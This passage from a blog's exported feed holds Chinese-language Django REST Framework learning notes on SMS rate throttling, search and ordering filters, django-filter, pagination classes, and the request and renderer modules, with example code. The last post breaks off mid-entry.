<p>写一个短信接口，设置<code>1/min</code>频率限制</p>
<h3 id="utils.throttles.py">utils.throttles.py</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> rest_framework.throttling <span class="keyword">import</span> SimpleRateThrottle</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SMSRateThrottle</span><span class="params">(SimpleRateThrottle)</span>:</span></span><br><span class="line">    scope = <span class="string">'sms'</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#只对提交手机号的get方法进行限制</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_cache_key</span><span class="params">(self, request, view)</span>:</span></span><br><span class="line">        mobile = request.query_params.get(<span class="string">'mobile'</span>)</span><br><span class="line">        <span class="comment">#没有手机号就不做频率限制</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> mobile:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="comment">#返回的信息可以用手机号动态变化，且不易重复的字符串，作为缓存的key</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'throttle_%(scope)s_%(ident)s'</span> % &#123;<span class="string">'scope'</span>: self.scope, <span class="string">'ident'</span>: mobile&#125;</span><br></pre></td></tr></table></figure>
<h3 id="settings.py">settings.py</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># drf配置</span></span><br><span class="line">REST_FRAMEWORK = &#123;</span><br><span class="line">    <span class="comment"># 频率限制条件配置</span></span><br><span class="line">    <span class="string">'DEFAULT_THROTTLE_RATES'</span>: &#123;</span><br><span class="line">        <span class="string">'sms'</span>: <span class="string">'1/min'</span></span><br><span class="line">    &#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="views.py">views.py</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> .throttles <span class="keyword">import</span> SMSRateThrottle</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestSMSAPIView</span><span class="params">(APIView)</span>:</span></span><br><span class="line">    <span class="comment"># 局部配置频率认证</span></span><br><span class="line">    throttle_classes = [SMSRateThrottle]</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> APIResponse(<span class="number">0</span>, <span class="string">'get 获取验证码 OK'</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">post</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> APIResponse(<span class="number">0</span>, <span class="string">'post 获取验证码  OK'</span>)</span><br></pre></td></tr></table></figure>
<h3 id="urls.py">urls.py</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> path</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> . <span class="keyword">import</span> views</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">'sms/'</span>, views.TestSMSAPIView.as_view()),</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<h2 id="postman测试">Postman测试</h2>
<ol type="1">
<li>只会对 <code>/api/sms/?mobile=具体手机号</code> 接口才会有频率限制，设置了限制频率，到达访问次数就会禁止</li>
<li>对 <code>/api/sms/</code> 或其他接口发送无限制</li>
<li>对数据包提交<code>mobile的/api/sms/</code>接口无限制</li>
<li>对不是<code>mobile</code>（如<code>phone</code>）字段提交的电话接口无限制</li>
</ol>
]]></content>
      <categories>
        <category>Tech</category>
      </categories>
      <tags>
        <tag>Learning Notes</tag>
        <tag>Tech</tag>
        <tag>Dev</tag>
        <tag>Backend</tag>
        <tag>Django</tag>
        <tag>Django REST Framework</tag>
        <tag>DRF</tag>
      </tags>
  </entry>
  <entry>
    <title>Django REST Framework 学习笔记（十四）：过滤器组件</title>
    <url>/tech/drf-learning-notes-14-filters/</url>
    <content><![CDATA[<ul>
<li>Title(EN): <em><strong>Django REST Framework Learning Notes (14): Filters</strong></em></li>
<li>Author: dog2</li>
</ul>
<hr />
<h1 id="基本信息">基本信息</h1>
<ul>
<li>源码 <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2VuY29kZS9kamFuZ28tcmVzdC1mcmFtZXdvcmsvYmxvYi9tYXN0ZXIvcmVzdF9mcmFtZXdvcmsvZmlsdGVycy5weQ==">rest_framework.filters<i class="fa fa-external-link-alt"></i></span></li>
<li>官方文档
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuZGphbmdvLXJlc3QtZnJhbWV3b3JrLm9yZy9hcGktZ3VpZGUvZmlsdGVyaW5nLw==">DRF API Guild - Filtering<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9kamFuZ28tZmlsdGVyLnJlYWR0aGVkb2NzLmlvL2VuL3N0YWJsZS8=">django-filter<i class="fa fa-external-link-alt"></i></span></li>
</ul></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2RvZy0yL2hlbGxvX2RyZi90cmVlL21hc3Rlci9ubzE0X2RyZl9maWx0ZXJzLw==">本文demo代码Github<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<a id="more"></a>
<h1 id="drf过滤组件">DRF过滤组件</h1>
<h2 id="drf搜索过滤组件">DRF搜索过滤组件</h2>
<h3 id="urls.py">urls.py</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> path</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> . <span class="keyword">import</span> views</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">     path(<span class="string">'cars/'</span>, views.CarListAPIView.as_view()),     <span class="comment"># SearchFilter</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<h3 id="views.py">views.py</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># drf的SearchFilter</span></span><br><span class="line"><span class="comment"># 第一步： 搜索过滤</span></span><br><span class="line"><span class="keyword">from</span> rest_framework.filters <span class="keyword">import</span> SearchFilter</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CarListAPIView</span><span class="params">(ListAPIView)</span>:</span></span><br><span class="line">    queryset = models.Car.objects.all()</span><br><span class="line">    serializer_class = serializers.CarModelSerializer  <span class="comment">#自定义认证</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 第二步：局部配置 过滤类 们（全局配置用DEFAULT_FILTER_BACKENDS）</span></span><br><span class="line">    filter_backends = [SearchFilter]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 第三步：SearchFilter过滤类依赖的过滤条件 =&gt; 接口：/cars/?search=...</span></span><br><span class="line">    search_fields = [<span class="string">'name'</span>, <span class="string">'price'</span>]  <span class="comment">#筛选字段</span></span><br><span class="line">    <span class="comment"># eg：/cars/?search=1，name和price中包含1的数据都会被查询出</span></span><br></pre></td></tr></table></figure>
<h2 id="drf排序过滤组件">DRF排序过滤组件</h2>
<h3 id="urls.py-1">urls.py</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> path</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> . <span class="keyword">import</span> views</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">     path(<span class="string">'cars2/'</span>, views.CarListAPIView2.as_view()),   <span class="comment"># OrderingFilter</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<h3 id="views.py-1">views.py</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 第一步：drf的OrderingFilter - 排序过滤</span></span><br><span class="line"><span class="keyword">from</span> rest_framework.filters <span class="keyword">import</span> OrderingFilter</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CarListAPIView2</span><span class="params">(ListAPIView)</span>:</span></span><br><span class="line">    queryset = models.Car.objects.all()</span><br><span class="line">    serializer_class = serializers.CarModelSerializer</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 第二步：局部配置 过滤类 们（全局配置用DEFAULT_FILTER_BACKENDS）</span></span><br><span class="line">    filter_backends = [OrderingFilter]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 第三步：OrderingFilter过滤类依赖的过滤条件 =&gt; 接口：/cars/?ordering=...</span></span><br><span class="line">    ordering_fields = [<span class="string">'pk'</span>, <span class="string">'price'</span>]</span><br><span class="line">    <span class="comment"># eg：/cars/?ordering=-price,pk，先按price降序，如果出现price相同，再按pk升序</span></span><br></pre></td></tr></table></figure>
<h1 id="自定义过滤器">自定义过滤器</h1>
<h2 id="urls.py-2">urls.py</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> path</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> . <span class="keyword">import</span> views</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">     path(<span class="string">'cars3/'</span>, views.CarListAPIView3.as_view()),   <span class="comment"># 自定义fitler</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<h2 id="filters.py">filters.py</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> . <span class="keyword">import</span> models</span><br><span class="line"></span><br><span class="line"><span class="comment"># 自定义过滤器，接口：?limit=显示的条数</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LimitFilter</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">filter_queryset</span><span class="params">(self, request, queryset, view)</span>:</span></span><br><span class="line">        <span class="comment"># 前台固定用 ?limit=... 传递过滤参数</span></span><br><span class="line">        limit = request.query_params.get(<span class="string">'limit'</span>)</span><br><span class="line">        <span class="keyword">if</span> limit:</span><br><span class="line">            limit = int(limit)</span><br><span class="line">            <span class="keyword">return</span> queryset[:limit]</span><br><span class="line">        <span class="keyword">return</span> queryset</span><br></pre></td></tr></table></figure>
<h2 id="views.py-2">views.py</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 自定义fitler</span></span><br><span class="line"><span class="keyword">from</span> .filters <span class="keyword">import</span> LimitFilter</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CarListAPIView3</span><span class="params">(ListAPIView)</span>:</span></span><br><span class="line">    <span class="comment"># 如果queryset没有过滤条件，就必须 .all()，不然分页会出问题</span></span><br><span class="line">    queryset = models.Car.objects.all()</span><br><span class="line">    serializer_class = serializers.CarModelSerializer</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 局部配置 过滤类 们（全局配置用DEFAULT_FILTER_BACKENDS）</span></span><br><span class="line">    filter_backends = [LimitFilter]</span><br></pre></td></tr></table></figure>
<h1 id="过滤器插件-django-filter">过滤器插件 django-filter</h1>
<h2 id="urls.py-3">urls.py</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> path</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> . <span class="keyword">import</span> views</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">     path(<span class="string">'cars4/'</span>, views.CarListAPIView4.as_view()),   <span class="comment"># 插件django-filter</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<h2 id="filters.py-1">filters.py</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># django-fitler插件：自定义过滤字段</span></span><br><span class="line"><span class="keyword">from</span> django_filters <span class="keyword">import</span> filters</span><br><span class="line"><span class="keyword">from</span> django_filters.rest_framework.filterset <span class="keyword">import</span> FilterSet</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CarFilterSet</span><span class="params">(FilterSet)</span>:</span></span><br><span class="line">    min_price = filters.NumberFilter(field_name=<span class="string">'price'</span>, lookup_expr=<span class="string">'gte'</span>)</span><br><span class="line">    max_price = filters.NumberFilter(field_name=<span class="string">'price'</span>, lookup_expr=<span class="string">'lte'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">        model = models.Car</span><br><span class="line">        fields = [<span class="string">'brand'</span>, <span class="string">'min_price'</span>, <span class="string">'max_price'</span>]</span><br><span class="line">        <span class="comment"># brand是model中存在的字段，一般都是可以用于分组的字段</span></span><br><span class="line">        <span class="comment"># min_price、max_price是自定义字段，需要自己自定义过滤条件</span></span><br></pre></td></tr></table></figure>
<h2 id="views.py-3">views.py</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># django-filter插件过滤器</span></span><br><span class="line"><span class="keyword">from</span> django_filters.rest_framework <span class="keyword">import</span> DjangoFilterBackend</span><br><span class="line"><span class="keyword">from</span> .filters <span class="keyword">import</span> CarFilterSet</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CarListAPIView4</span><span class="params">(ListAPIView)</span>:</span></span><br><span class="line">    queryset = models.Car.objects.all()</span><br><span class="line">    serializer_class = serializers.CarModelSerializer</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 局部配置 过滤类 们（全局配置用DEFAULT_FILTER_BACKENDS）</span></span><br><span class="line">    filter_backends = [DjangoFilterBackend]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># django-filter过滤器插件使用</span></span><br><span class="line">    <span class="comment">#filter_class = CarFilterSet</span></span><br><span class="line">    filterset_class = CarFilterSet  <span class="comment"># 旧版写作filter_class, 新版写作fitlerset_class</span></span><br><span class="line">    <span class="comment"># 接口：?brand=...&amp;min_price=...&amp;max_price=...</span></span><br><span class="line">    <span class="comment"># eg:?brand=宝马&amp;min_price=5&amp;max_price=10 =&gt; 5~10间的宝马牌汽车</span></span><br></pre></td></tr></table></figure>
<h1 id="扩展阅读">扩展阅读</h1>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vWHVDaGVuZ05vdGVzL3AvMTIwMTk3NzQuaHRtbA==">drf 过滤器组件与自定义过滤器<i class="fa fa-external-link-alt"></i></span></li>
</ul>
]]></content>
      <categories>
        <category>Tech</category>
      </categories>
      <tags>
        <tag>Learning Notes</tag>
        <tag>Tech</tag>
        <tag>Dev</tag>
        <tag>Backend</tag>
        <tag>Django</tag>
        <tag>Django REST Framework</tag>
        <tag>DRF</tag>
      </tags>
  </entry>
  <entry>
    <title>Django REST Framework 学习笔记（十五）：分页组件</title>
    <url>/tech/drf-learning-notes-15-pagination/</url>
    <content><![CDATA[<ul>
<li>Title(EN): <em><strong>Django REST Framework Learning Notes (15): Pagination</strong></em></li>
<li>Author: dog2</li>
</ul>
<hr />
<h1 id="基本信息">基本信息</h1>
<ul>
<li>源码 <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2VuY29kZS9kamFuZ28tcmVzdC1mcmFtZXdvcmsvYmxvYi9tYXN0ZXIvcmVzdF9mcmFtZXdvcmsvcGFnaW5hdGlvbi5weQ==">rest_framework.pagination<i class="fa fa-external-link-alt"></i></span></li>
<li>官方文档 <span class="exturl" data-url="aHR0cHM6Ly93d3cuZGphbmdvLXJlc3QtZnJhbWV3b3JrLm9yZy9hcGktZ3VpZGUvcGFnaW5hdGlvbi8=">API Guild - Pagination<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2RvZy0yL2hlbGxvX2RyZi90cmVlL21hc3Rlci9ubzE1X2RyZl9wYWdpbmF0aW9uLw==">本文demo代码Github<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<a id="more"></a>
<h1 id="drf分页类">DRF分页类</h1>
<h2 id="基础分页类-pagenumberpagination">基础分页类 PageNumberPagination</h2>
<h3 id="urls.py">urls.py</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> path</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> . <span class="keyword">import</span> views</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">'cars/'</span>, views.CarListAPIView.as_view()),     <span class="comment"># 基础分页</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<h3 id="views.py">views.py</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> rest_framework.generics <span class="keyword">import</span> ListAPIView</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> . <span class="keyword">import</span> models, serializers, paginations</span><br><span class="line"></span><br><span class="line"><span class="comment"># 基础分页 PageNumberPagination</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CarListAPIView</span><span class="params">(ListAPIView)</span>:</span></span><br><span class="line">    <span class="comment"># 如果queryset没有过滤条件，就必须 .all()，不然分页会出问题</span></span><br><span class="line">    queryset = models.Car.objects.all()</span><br><span class="line">    serializer_class = serializers.CarModelSerializer</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 分页组件 - 给视图类配置分页类即可 - 分页类需要自定义，继承drf提供的分页类即可</span></span><br><span class="line">    pagination_class = paginations.MyPageNumberPagination</span><br><span class="line"></span><br><span class="line">    <span class="comment">#eg:/cars/  显示第一页三条</span></span><br><span class="line">    <span class="comment">#/cars/?page=2&amp;page_size=4   每页显示4条，显示第二页的4条</span></span><br></pre></td></tr></table></figure>
<h2 id="偏移分页类-limitoffsetpagination">偏移分页类 LimitOffsetPagination</h2>
<h3 id="urls.py-1">urls.py</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> path</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> . <span class="keyword">import</span> views</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">     path(<span class="string">'cars1/'</span>, views.CarListAPIView1.as_view()),     <span class="comment"># 偏移分页</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<h3 id="views.py-1">views.py</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 偏移分页 LimitOffsetPagination</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CarListAPIView1</span><span class="params">(ListAPIView)</span>:</span></span><br><span class="line">    <span class="comment"># 如果queryset没有过滤条件，就必须 .all()，不然分页会出问题</span></span><br><span class="line">    queryset = models.Car.objects.all()</span><br><span class="line">    serializer_class = serializers.CarModelSerializer</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 分页组件 - 给视图类配置分页类即可 - 分页类需要自定义，继承drf提供的分页类即可</span></span><br><span class="line">    pagination_class = paginations.MyLimitOffsetPagination</span><br></pre></td></tr></table></figure>
<h2 id="游标分页类-cursorpagination">游标分页类 CursorPagination</h2>
<h3 id="urls.py-2">urls.py</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> path</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> . <span class="keyword">import</span> views</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">     path(<span class="string">'cars2/'</span>, views.CarListAPIView2.as_view()),   <span class="comment"># 游标分页</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<h3 id="views.py-2">views.py</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 游标分页 CursorPagination</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CarListAPIView2</span><span class="params">(ListAPIView)</span>:</span></span><br><span class="line">    <span class="comment"># 如果queryset没有过滤条件，就必须 .all()，不然分页会出问题</span></span><br><span class="line">    queryset = models.Car.objects.all()</span><br><span class="line">    serializer_class = serializers.CarModelSerializer</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 分页组件 - 给视图类配置分页类即可 - 分页类需要自定义，继承drf提供的分页类即可</span></span><br><span class="line">    pagination_class = paginations.MyCursorPagination</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Tech</category>
      </categories>
      <tags>
        <tag>Learning Notes</tag>
        <tag>Tech</tag>
        <tag>Dev</tag>
        <tag>Backend</tag>
        <tag>Django</tag>
        <tag>Django REST Framework</tag>
        <tag>DRF</tag>
      </tags>
  </entry>
  <entry>
    <title>Django REST Framework 学习笔记（二）：请求模块 request</title>
    <url>/tech/drf-learning-notes-2-the-request-module/</url>
    <content><![CDATA[<ul>
<li>Title(EN): <em><strong>Django REST Framework Learning Notes (2): the request module</strong></em></li>
<li>Author: dog2</li>
</ul>
<hr />
<h1 id="drf请求生命周期流程">DRF请求生命周期流程</h1>
<ol type="1">
<li>根据应用中<code>urls.py</code>，走<code>as_view</code>方法，但是视图类没有该方法，所以请求走的是<code>APIView</code>的<code>as_view</code>方法</li>
<li>在<code>APIView</code>的<code>as_view</code>调用父类(django原生View)的<code>as_view</code>，同时还禁用了 csrf 认证</li>
<li>在父类（django原生View）的<code>as_view</code>中<code>dispatch</code>方法请求走的又是<code>APIView</code>的<code>dispatch</code>
<ul>
<li>因为<code>APIView</code>也可以走<code>dispatch</code>，视图类是先继承<code>APIView</code>，<code>APIView</code>中没有再去原生<code>View</code>中</li>
</ul></li>
<li>完成任务方法交给视图类的请求函数处理，得到请求的响应结果，返回给前台</li>
</ol>
<p>因此直接从APIView的dispatch入口看源码。</p>
<h1 id="请求模块">请求模块</h1>
<h2 id="基本信息">基本信息</h2>
<ul>
<li>源码：<a href="https://github.com/encode/django-rest-framework/blob/master/rest_framework/request.py" target="_blank" rel="noopener"><code>rest_framework.request</code></a>
<ul>
<li><code>rest_framework.request.Request</code>：主要类</li>
</ul></li>
<li>官方文档：<span class="exturl" data-url="aHR0cHM6Ly93d3cuZGphbmdvLXJlc3QtZnJhbWV3b3JrLm9yZy9hcGktZ3VpZGUvcmVxdWVzdHMv">API Guild - Requests<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<a id="more"></a>
<h2 id="源码分析">源码分析</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 在`APIView`类的`dispatch`方法中，二次封装request (请求模块)</span></span><br><span class="line">request = self.initialize_request(request, *args, **kwargs)   <span class="comment">#点进去</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#点击查看Request源码</span></span><br><span class="line"><span class="keyword">return</span> Request(</span><br><span class="line">　　request,</span><br><span class="line">　　...</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在rest_framework.request.Request实例化方法中</span></span><br><span class="line">self._request = request         <span class="comment">#将原生request作为drf request的_request属性</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 在rest_framework.request.Request的__getattr__方法中</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">return</span> getattr(self._request, attr)  <span class="comment"># 访问属性完全兼容原生request</span></span><br><span class="line"><span class="keyword">except</span> AttributeError:</span><br><span class="line">    <span class="keyword">return</span> self.__getattribute__(attr)</span><br></pre></td></tr></table></figure>
<h2 id="总结">总结</h2>
<ol type="1">
<li>drf 对原生<code>request</code>做了二次封装，设置<code>request._request</code>等于原生<code>request</code></li>
<li>原生<code>request</code>对象的属性和方法都可以被drf的<code>request</code>对象直接访问(兼容)</li>
<li>drf请求的所有url拼接参数均被解析到<code>query_params</code>中，所有数据包数据都被<code>parser</code>解析到<code>data</code>中
<ul>
<li>get请求：url中拼接的参数通过<code>request.query_params</code>获取</li>
<li>post请求：所有请求方式所携带的数据包都是通过<code>request.data</code>获取</li>
</ul></li>
</ol>
<h2 id="用法示例">用法示例</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span><span class="params">(APIView)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="comment"># url拼接的参数</span></span><br><span class="line">        print(request._request.GET)  <span class="comment"># 二次封装方式</span></span><br><span class="line">        print(request.GET) <span class="comment"># 兼容</span></span><br><span class="line">        print(request.query_params) <span class="comment"># 拓展</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> Response(<span class="string">'drf get ok'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">post</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="comment"># 所有请求方式携带的数据包</span></span><br><span class="line">        print(request._request.POST)  <span class="comment"># 二次封装方式</span></span><br><span class="line">        print(request.POST)  <span class="comment"># 兼容</span></span><br><span class="line">        print(request.data)  <span class="comment"># 拓展，兼容性最强，三种传参方式都可以：form-data,urlencoding,json</span></span><br><span class="line"></span><br><span class="line">        print(request.query_params)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> Response(<span class="string">'drf post ok'</span>)</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Tech</category>
      </categories>
      <tags>
        <tag>Learning Notes</tag>
        <tag>Tech</tag>
        <tag>Dev</tag>
        <tag>Backend</tag>
        <tag>Django</tag>
        <tag>Django REST Framework</tag>
        <tag>DRF</tag>
      </tags>
  </entry>
  <entry>
    <title>Django REST Framework 学习笔记（三）：渲染模块 renders</title>
    <url>/tech/drf-learning-notes-3-the-renders-module/</url>
    <content><![CDATA[<ul>
<li>Title(EN): <em><strong>Django REST Framework Learning Notes (3): the renders module</strong></em></li>
<li>Author: dog2</li>
</ul>
<hr />
<p>用DRF做测试会发现，用浏览器请求API返回DRF定制的页面，对开发者相当友好，如下图：</p>
<p><img src="https://www.django-rest-framework.org/img/quickstart.png" /></p>
<p>而若使用python第三方模块requests或者postman等工具，这则返回的是原生的json数据。</p>
<p>实现这种差别响应的，正是本节的主角——(响应)渲染模块。</p>
<h1 id="基本信息">基本信息</h1>
<ul>
<li>源码：<a href="https://github.com/encode/django-rest-framework/blob/master/rest_framework/renders.py" target="_blank" rel="noopener"><code>rest_framework.renders</code></a>
<ul>
<li><code>rest_framework.request.Request</code>：主要类</li>
</ul></li>
<li>官方文档：<span class="exturl" data-url="aHR0cHM6Ly93d3cuZGphbmdvLXJlc3QtZnJhbWV3b3JrLm9yZy9hcGktZ3VpZGUvcmVuZGVyZXJzLw==">API Guild - Renderers<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<a id="more"></a>
<h1 id="源码分析">源码分析</h1>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 在`APIView`类的`dispatch`方法中，最后解析reponse对象数据</span></span><br><span class="line">self.response = self.finalize_response(request, response, *args, **kwargs) <span class="comment">#点进去</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 拿到运行的解析类的对象们</span></span><br><span class="line">neg = self.perform_content_negotiation(request, force=<span class="literal">True</span>)   <span class="comment">#点进去</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获得解析类对象</span></span><br><span class="line">renderers = self.get_renderers()   <span class="comment">#点进去</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 从视图类中得到renderer_classes请求类，如何实例化一个个对象形参解析类对象列表</span></span><br><span class="line"><span class="keyword">return</span> [renderer() <span class="keyword">for</span> renderer <span class="keyword">in</span> self.renderer_classes]  <span class="comment">#配置文件</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># self.renderer_classes为APIView类属性</span></span><br><span class="line">renderer_classes = api_settings.DEFAULT_RENDERER_CLASSES</span><br><span class="line"></span><br><span class="line"><span class="comment"># api_settings中的默认渲染类</span></span><br><span class="line"><span class="string">'DEFAULT_RENDERER_CLASSES'</span>: [</span><br><span class="line">        <span class="string">'rest_framework.renderers.JSONRenderer'</span>,</span><br><span class="line">        <span class="string">'rest_framework.renderers.BrowsableAPIRenderer'</span>,</span><br><span class="line">],</span><br></pre></td></tr></table></figure>
<h1 id="总结">总结</h1>
<p>调用链如下：</p>
<ol type="1">
<li>自己视图类的类属性(局部配置)</li>
<li><code>APIView</code>类的类属性设置</li>
<li>自己配置文件的<code>DEFAULT_RENDERER_CLASSES</code>(全局配置)</li>
<li>drf配置文件的<code>DEFAULT_RENDERER_CLASSES</code></li>
</ol>
<h1 id="用法示例">用法示例</h1>
<h2 id="自定义全局配置">自定义全局配置</h2>
<p>所有视图类统一处理，在项目的<code>settings.py</code>中</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">REST_FRAMEWORK = &#123;</span><br><span class="line">    <span class="comment"># drf提供的渲染类</span></span><br><span class="line">    <span class="string">'DEFAULT_RENDERER_CLASSES'</span>: [</span><br><span class="line">        <span class="string">'rest_framework.renderers.JSONRenderer'</span>,       <span class="comment">#只显示出json数据</span></span><br><span class="line">      <span class="string">'rest_framework.renderers.BrowsableAPIRenderer'</span>,    <span class="comment">#渲染出页面，注意是BrowsableAPIRenderer</span></span><br><span class="line">    ],</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="自定义局部配置">自定义局部配置</h2>
<p>某一个或一些实体类单独处理，在<code>views.py</code>视图类中提供对应的类属性</p>
